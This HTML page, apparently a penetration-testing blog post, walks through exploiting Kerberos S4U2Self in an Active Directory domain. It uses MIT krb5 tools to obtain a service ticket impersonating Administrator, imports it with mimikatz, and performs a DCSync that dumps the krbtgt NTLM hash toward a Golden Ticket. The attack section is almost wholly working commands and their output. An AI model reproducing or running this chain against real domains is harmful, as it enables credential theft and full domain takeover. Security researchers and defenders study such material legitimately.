<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Practical Exploitation of S4U2Self</title>
</head><body>There are a number of issues with exploitation of this natively in Windows. The API calls used which would request a ticket are based around 'impersonating' a user, and as such the user must have the '<b>SeTcbPrivilege</b>' and '<b>SeImpersonate</b>' privileges, which is normally reserved for service accounts and the SYSTEM account. <br/>
As such our initial exploitation techniques use the Linux MIT krb5-user tools (1.12.1 or later is recommended as an issue in 1.12 prevents exploitation of this issue).<br/>
<br/>
Troubleshooting hints: Use UPPERCASE domains, and use the FQDN for the target hostname.<br/>
<br/>
<br/>
<b>Step 1 - Create a KeyTab file for the service account</b><br/>
For this we use the ktutil tool, which opens an interactive prompt:<br/>
<br/>
# ktutil<br/>
&nbsp;ktutil: addent -password -p svc_t2a4d@CONTOSO.COM -k 1 -e rc4-hmac<br/>
&nbsp;Password for svc_t2a4d@CONTOSO.COM:<br/>
&nbsp;ktutil: wkt /root/test.keytab<br/>
&nbsp;ktutil: exit<br/>
<br/>
<br/>
<b>Step 2 - Retrieve a Ticket Granting Ticket (TGT) for the service account</b><br/>
<br/>
# kinit -V -k -t ~/test.keytab -f svc_t2a4d@CONTOSO.COM<br/>
&nbsp;Using default cache: /tmp/krb5cc_0<br/>
&nbsp;Using principal: svc_t2a4d@CONTOSO.COM<br/>
&nbsp;Using keytab: /root/test.keytab<br/>
&nbsp;Authenticated to Kerberos v5<br/>
<br/>
<br/>
<b>Step 3 - Request a Ticket Granting Service (TGS) Ticket for the target service as the impersonated user (in this case 'Administrator')</b><br/>
<br/>
# kvno -e rc4-hmac -k ~/test.keytab -P -U Administrator ldap/WIN-TOVFLFKO4DB.contoso.com@CONTOSO.COM<br/>
&nbsp;ldap/WIN-TOVFLFKO4DB.contoso.com@CONTOSO.COM: kvno = 4, keytab entry valid<br/>
<br/>
Now if we check klist -f we should see a ticket for the target service with the forwardable flag 'F'.<br/>
<br/>
07/12/16 19:47:10 08/12/16 05:47:05 ldap/WIN-TOVFLFKO4DB.contoso.com@CONTOSO.COM<br/>
&nbsp;for client Administrator@CONTOSO.COM, renew until 08/12/16 19:47:05, Flags: FPRAO<br/>
<br/>
<br/>
<b>Step ... - Perform DCSync with samba-tool or secretsdump.py?</b><br/>
<br/>
Unfortunately we've been unable to complete the full attack chain using Linux tooling. You should be able to use both samba-tool (see passing-the-hash blogpost) and secretsdump.py using existing Kerberos tickets, but we were unable to get this working. Hopefully when we can get these tools up and running we will update this post with full steps.<br/>
<br/>
<br/>
<b>Step 4 - Pass the Kerberos Ticket in Windows<br/>
</b><br/>
Instead we move to a Windows environment and use mimikatz to import our CCache file. First we use a little tip from Mr Delpy to ensure we don't have any user credentials that could interfere with our connections.<br/>
<br/>
runas /noprofile /netonly /user:noone@nowhere.com mimikatz.exe<br/>
mimikatz # kerberos::ptc krb5cc_0<br/>
Principal : (01) : svc_t2a4d ; @ CONTOSO.COM<br/>
...<br/>
Data 3<br/>
&nbsp;Start/End/MaxRenew: 07/12/2016 22:29:57 ; 08/12/2016 08:29:55 ; 08/12/2016 22:29:55<br/>
&nbsp;Service Name (01) : ldap ; WIN-TOVFLFKO4DB.contoso.com ; @ CONTOSO.COM<br/>
&nbsp;Target Name (01) : ldap ; WIN-TOVFLFKO4DB.contoso.com ; @ CONTOSO.COM<br/>
&nbsp;Client Name (10) : Administrator ; @ CONTOSO.COM<br/>
&nbsp;Flags 50a40000 : ok_as_delegate ; pre_authent ; renewable ; proxiable ; forwardable ;<br/>
&nbsp;Session Key : 0x00000017 - rc4_hmac_nt eb28ab360d2f96f5f3eaad7ccde58222<br/>
&nbsp;Ticket : 0x00000000 - null ; kvno = 2<br/>
&nbsp;[...]<br/>
&nbsp;* Injecting ticket : OK<br/>
<br/>
<br/>
<b>Step 5 - Perform DCSync Attack and Profit<br/>
</b><br/>
We can now DCSync our KRBTGT user for a Golden Ticket:<br/>
<br/>
mimikatz # lsadump::dcsync /user:krbtgt<br/>
&nbsp;[DC] 'contoso.com' will be the domain<br/>
&nbsp;[DC] 'WIN-TOVFLFKO4DB.contoso.com' will be the DC server<br/>
&nbsp;[DC] 'krbtgt' will be the user account<br/>
Object RDN : krbtgt<br/>
** SAM ACCOUNT **<br/>
SAM Username : krbtgt<br/>
&nbsp;Account Type : 30000000 ( USER_OBJECT )<br/>
&nbsp;User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )<br/>
&nbsp;Account expiration :<br/>
&nbsp;Password last change : 07/12/2016 13:04:14<br/>
&nbsp;Object Security ID : S-1-5-21-1225692627-2309707116-1207525572-502<br/>
&nbsp;Object Relative ID : 502<br/>
Credentials:<br/>
&nbsp;Hash NTLM: 049ca947471d4ef006315bb8312c6ba0</body></html>